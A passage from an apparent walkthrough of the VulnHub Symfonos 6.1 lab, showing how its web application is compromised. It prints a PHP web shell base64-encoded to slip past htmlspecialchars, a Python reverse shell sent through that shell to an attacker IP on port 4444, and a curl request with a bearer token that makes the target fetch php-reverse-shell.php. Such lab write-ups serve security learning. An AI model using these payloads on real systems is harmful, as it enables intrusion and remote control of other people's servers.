...
5. Try `php/webapps/41918.txt`
	...
	6. Wait for administrator to visit the post, `script.js` is queried
		...
		```
	7. [POC Video](https://www.youtube.com/watch?v=eCf9a0QpnPs)
...
6. Obtain a shell by bypassing `htmlspecialchars` & inserting a web shell
	1. Authenticate
		...
		```
	2. Encode webshell to bypass `htmlspecialchars`
		```
		echo '<?php system($_GET["cmd"]); ?>' | base64
		PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
		```
	3. Insert a webshell to `/posts`
		```
		...
		```
		- Webshell is inserted to the body of `/posts`, however, the code is not executed yet.
	4. Execute our payload by visting `/posts`
		```
		┌──(root💀kali)-[~/vulnHub/Symfonos-6.1]
	...
	5. Obtain a shell
		...
		http://192.168.110.25/posts/shell.php?cmd=python+-c+%27a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.110.4",4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh"
		```
		![](Pasted%20image%2020220211041107.png)
		![](Pasted%20image%2020220211041137.png)
7. Simpler alternative, also bypassing `htmlspecialchars`
	1. Insert php code to download `php-reverse-shell.php` into the body of `/posts`
		```
		┌──(root💀kali)-[~/vulnHub/Symfonos-6.1/192.168.110.24/exploit/api]
		└─# curl --header 'Authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDUxNTYwOTIsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.K2htM7cr61qekEVl4ueWKvblmQAmTbMMg7LaQgPvIb4' --data "{\"text\":\"system('wget 192.168.110.4/php-reverse-shell.php')\"}" --header "Content-Type: application/json" http://$ip:5000/ls2o4g/v1.0/posts/
